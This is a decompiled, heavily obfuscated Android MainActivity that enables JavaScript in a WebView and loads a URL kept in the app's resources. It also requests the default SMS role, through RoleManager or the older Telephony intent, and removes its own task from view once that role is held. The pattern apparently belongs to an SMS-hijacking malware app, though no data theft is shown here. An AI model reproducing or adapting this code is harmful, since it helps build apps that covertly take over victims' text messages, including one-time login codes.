package com.vdodsodjsdt;

import android.app.NotificationManager;
import android.app.role.RoleManager;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.util.LinkedHashMap;
import java.util.WeakHashMap;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final class MainActivity extends zf8a67a5ZO524dLUgOFxsfO {
    public static final /* synthetic */ int O1xDAlBZZlZdoEf747lCFHld = 0;
    public boolean SuB3hEmTmbbRGAhtvOOmfKEon;
    public boolean aXO0LSrt8bKV;
    public boolean pzqP2AqKW6J5PO8zCKnW;
    public final BgOStbPrbmZvR4Qn vE4yDIjexsP2lGjLaTcB;

    public MainActivity() {
        ((ALnH3AptNOGA7UbXGxOl2SnVeZ) this.zIvmSL0wzmmKGc3X39b2Gw2mUGE.V57tEvNfxZVVcOCAOih5PKr).LaeGQIruHQu81hfJldjMOQSVblH3x("androidx:appcompat", new TJtCCLr1LnbRdZiO8wmH979d1k(this));
        NSjgqmGjEzuugn2SsG1mZFP(new GBQKYLs33Vv2lL6PzPEs62MQqu(this));
        final djxYNRJDv16Q djxynrjdv16q = new djxYNRJDv16Q(1);
        final Jc01di1Hsv jc01di1Hsv = new Jc01di1Hsv(3, this);
        final npN16DNLGdVu2 npn16dnlgdvu2 = this.HzCpKshMOoaw76hFcbOVRYMeRd;
        ej6unYlOWMDF.pYmKDYlAmhudp(npn16dnlgdvu2, "registry");
        final String str = "activity_rq#" + this.M9e7PWhFYLD2lOGMker.getAndIncrement();
        LinkedHashMap linkedHashMap = npn16dnlgdvu2.V57tEvNfxZVVcOCAOih5PKr;
        ej6unYlOWMDF.pYmKDYlAmhudp(str, "key");
        androidx.lifecycle.iVKrTMqOw0TqCeNN ivkrtmqow0tqcenn = this.V57tEvNfxZVVcOCAOih5PKr;
        if (ivkrtmqow0tqcenn.V57tEvNfxZVVcOCAOih5PKr.compareTo(Cg8BA4YSFFWr8.zIvmSL0wzmmKGc3X39b2Gw2mUGE) >= 0) {
            throw new IllegalStateException(("LifecycleOwner " + this + " is attempting to register while current state is " + ivkrtmqow0tqcenn.V57tEvNfxZVVcOCAOih5PKr + ". LifecycleOwners must call register before they are STARTED.").toString());
        }
        npn16dnlgdvu2.ZfQNn8hdWlEQ5cR94249PDsLR(str);
        msmSVlFwXA4k5 msmsvlfwxa4k5 = (msmSVlFwXA4k5) linkedHashMap.get(str);
        msmsvlfwxa4k5 = msmsvlfwxa4k5 == null ? new msmSVlFwXA4k5(ivkrtmqow0tqcenn) : msmsvlfwxa4k5;
        W3ZqXaAE9m3wS w3ZqXaAE9m3wS = new W3ZqXaAE9m3wS() { // from class: com.vdodsodjsdt.yikP6Hu9tsecSsMmPcFb8c2EZEvvC
            @Override // com.vdodsodjsdt.W3ZqXaAE9m3wS
            public final void zzpBGItXfub0yWj(hCgEybj69le8 hcgeybj69le8, XOTOHmUA5NYhlyOBh7 xOTOHmUA5NYhlyOBh7) throws Throwable {
                XOTOHmUA5NYhlyOBh7 xOTOHmUA5NYhlyOBh72 = XOTOHmUA5NYhlyOBh7.ON_START;
                npN16DNLGdVu2 npn16dnlgdvu22 = npn16dnlgdvu2;
                String str2 = str;
                if (xOTOHmUA5NYhlyOBh72 != xOTOHmUA5NYhlyOBh7) {
                    if (XOTOHmUA5NYhlyOBh7.ON_STOP == xOTOHmUA5NYhlyOBh7) {
                        npn16dnlgdvu22.LaeGQIruHQu81hfJldjMOQSVblH3x.remove(str2);
                        return;
                    } else {
                        if (XOTOHmUA5NYhlyOBh7.ON_DESTROY == xOTOHmUA5NYhlyOBh7) {
                            npn16dnlgdvu22.LaeGQIruHQu81hfJldjMOQSVblH3x(str2);
                            return;
                        }
                        return;
                    }
                }
                LinkedHashMap linkedHashMap2 = npn16dnlgdvu22.LaeGQIruHQu81hfJldjMOQSVblH3x;
                Bundle bundle = npn16dnlgdvu22.ZLZeBXTMq0zDztBxtRTuCHrapQ;
                LinkedHashMap linkedHashMap3 = npn16dnlgdvu22.zIvmSL0wzmmKGc3X39b2Gw2mUGE;
                Jc01di1Hsv jc01di1Hsv2 = jc01di1Hsv;
                linkedHashMap2.put(str2, new WlL3REfr7Vc(jc01di1Hsv2, djxynrjdv16q));
                if (linkedHashMap3.containsKey(str2)) {
                    Object obj = linkedHashMap3.get(str2);
                    linkedHashMap3.remove(str2);
                    jc01di1Hsv2.VxUQ9tBhpHJ2AAEDNW8sghc4m(obj);
                }
                zHpcvbo7P2 zhpcvbo7p2 = (zHpcvbo7P2) FLWIoSaHb1q8TqFvEBgPyRGrzvi6.qNPQb1obP7(str2, bundle);
                if (zhpcvbo7p2 != null) {
                    bundle.remove(str2);
                    jc01di1Hsv2.VxUQ9tBhpHJ2AAEDNW8sghc4m(new zHpcvbo7P2(zhpcvbo7p2.ZfQNn8hdWlEQ5cR94249PDsLR, zhpcvbo7p2.V57tEvNfxZVVcOCAOih5PKr));
                }
            }
        };
        msmsvlfwxa4k5.VxUQ9tBhpHJ2AAEDNW8sghc4m.VxUQ9tBhpHJ2AAEDNW8sghc4m(w3ZqXaAE9m3wS);
        msmsvlfwxa4k5.zzpBGItXfub0yWj.add(w3ZqXaAE9m3wS);
        linkedHashMap.put(str, msmsvlfwxa4k5);
        this.vE4yDIjexsP2lGjLaTcB = new BgOStbPrbmZvR4Qn(npn16dnlgdvu2, str, djxynrjdv16q);
    }

    public final void ko09zE6UAgwkV() {
        int i = Build.VERSION.SDK_INT;
        BgOStbPrbmZvR4Qn bgOStbPrbmZvR4Qn = this.vE4yDIjexsP2lGjLaTcB;
        if (i < 29) {
            Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
            intent.putExtra("package", getApplication().getPackageName());
            bgOStbPrbmZvR4Qn.wR7sbzHKf9hYV1lxoS6nqyszepWvN(intent);
            return;
        }
        RoleManager roleManagerZzpBGItXfub0yWj = NeiBzdigGVkOo7gD.zzpBGItXfub0yWj(getSystemService(NeiBzdigGVkOo7gD.HzCpKshMOoaw76hFcbOVRYMeRd()));
        if (roleManagerZzpBGItXfub0yWj.isRoleHeld("android.app.role.SMS")) {
            finishAndRemoveTask();
            return;
        }
        Intent intentCreateRequestRoleIntent = roleManagerZzpBGItXfub0yWj.createRequestRoleIntent("android.app.role.SMS");
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(intentCreateRequestRoleIntent, "createRequestRoleIntent(...)");
        bgOStbPrbmZvR4Qn.wR7sbzHKf9hYV1lxoS6nqyszepWvN(intentCreateRequestRoleIntent);
    }

    @Override // com.vdodsodjsdt.zf8a67a5ZO524dLUgOFxsfO, com.vdodsodjsdt.zlpVhmuRpIfHYqU, com.vdodsodjsdt.jOCHSDr891Bpw8RplQXPUZuF07s, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        bo8GoCDtrHITMkZtFiNNduouMiGY bo8gocdtrhitmkztfinnduoumigy = new bo8GoCDtrHITMkZtFiNNduouMiGY();
        JtQzUw7TKDRZv8Cwx jtQzUw7TKDRZv8Cwx = new JtQzUw7TKDRZv8Cwx(0, 0, bo8gocdtrhitmkztfinnduoumigy);
        int i = ncoCeCp5Qx3rLd.VxUQ9tBhpHJ2AAEDNW8sghc4m;
        int i2 = ncoCeCp5Qx3rLd.zzpBGItXfub0yWj;
        bo8GoCDtrHITMkZtFiNNduouMiGY bo8gocdtrhitmkztfinnduoumigy2 = new bo8GoCDtrHITMkZtFiNNduouMiGY();
        JtQzUw7TKDRZv8Cwx jtQzUw7TKDRZv8Cwx2 = new JtQzUw7TKDRZv8Cwx(i, i2, bo8gocdtrhitmkztfinnduoumigy2);
        View decorView = getWindow().getDecorView();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(decorView, "getDecorView(...)");
        Resources resources = decorView.getResources();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(resources, "getResources(...)");
        boolean zBooleanValue = ((Boolean) bo8gocdtrhitmkztfinnduoumigy.GI83zq0G8e7zkn(resources)).booleanValue();
        Resources resources2 = decorView.getResources();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(resources2, "getResources(...)");
        boolean zBooleanValue2 = ((Boolean) bo8gocdtrhitmkztfinnduoumigy2.GI83zq0G8e7zkn(resources2)).booleanValue();
        int i3 = Build.VERSION.SDK_INT;
        KfeOQNOupsCg6878zi4e jyljccwfdr6dzgzx7zl = i3 >= 30 ? new jYLjccWFDr6DZgZx7Zl() : i3 >= 29 ? new h1EAQ42wUe() : i3 >= 28 ? new W1Of0szM8Gc() : i3 >= 26 ? new VEafE3ZbIWiANd6otqHrYWA() : new in0lvNvvH4hQTyPzIFRv6WZ();
        Window window = getWindow();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(window, "getWindow(...)");
        jyljccwfdr6dzgzx7zl.JUdwvN8LfOMa(jtQzUw7TKDRZv8Cwx, jtQzUw7TKDRZv8Cwx2, window, decorView, zBooleanValue, zBooleanValue2);
        Window window2 = getWindow();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(window2, "getWindow(...)");
        jyljccwfdr6dzgzx7zl.VxUQ9tBhpHJ2AAEDNW8sghc4m(window2);
        setContentView(R.layout.activity_main);
        View viewFindViewById = findViewById(R.id.main);
        ojJdkROPjZ ojjdkropjz = new ojJdkROPjZ(11);
        WeakHashMap weakHashMap = xb0r6yEzq0tw9m7nTWG5BFR8.VxUQ9tBhpHJ2AAEDNW8sghc4m;
        lJgFFp37ou.M9e7PWhFYLD2lOGMker(viewFindViewById, ojjdkropjz);
        if (i3 >= 26) {
            dHjTZhFdz83jRToEoo.LaeGQIruHQu81hfJldjMOQSVblH3x();
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(dHjTZhFdz83jRToEoo.zzpBGItXfub0yWj());
        }
        View viewFindViewById2 = findViewById(R.id.webview);
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(viewFindViewById2, "findViewById(...)");
        WebView webView = (WebView) viewFindViewById2;
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setSupportZoom(false);
        webView.setWebViewClient(new WebViewClient());
        ko09zE6UAgwkV();
        webView.loadUrl(getResources().getText(R.string.URL).toString());
    }
}
